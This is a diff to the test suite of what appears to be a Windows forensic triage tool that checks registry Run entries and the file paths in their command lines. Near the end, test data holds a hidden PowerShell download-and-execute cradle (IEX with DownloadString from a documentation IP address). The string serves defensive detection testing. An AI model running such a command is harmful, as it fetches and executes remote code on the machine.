@@ -382,6 +382,17 @@ def test_at_most_three_files_a_line_runs_are_checked(triage):
     assert sent == {f"{S32}cmd.exe", "C:\\a\\1.exe", "C:\\a\\2.exe", "C:\\a\\3.exe", line}
 
 
+@pytest.mark.parametrize("tail", [".dll,Start", "x.dll"])
+def test_a_quoted_path_glued_to_more_text_isnt_a_target(triage, tail):
+    """`"…svchost.exe".dll` names no file that ends at the quote: the quoted
+    part isn't sent, and its verdict isn't stamped on the entry."""
+    line = f'rundll32.exe "{SVCHOST}"{tail}'
+    docs = [_reg("glued", RUN, line)]
+    _, sent, _ = triage({"case-cmdline-registry-h1": docs}, {SVCHOST: SUSP})
+    assert SVCHOST not in sent, sent
+    assert full(docs)["glued"] == ("UNKNOWN", False, "low")
+
+
 LONG = ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c "
         "\"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')\" "
         + "#" * 400)[:315]  # fmt: skip
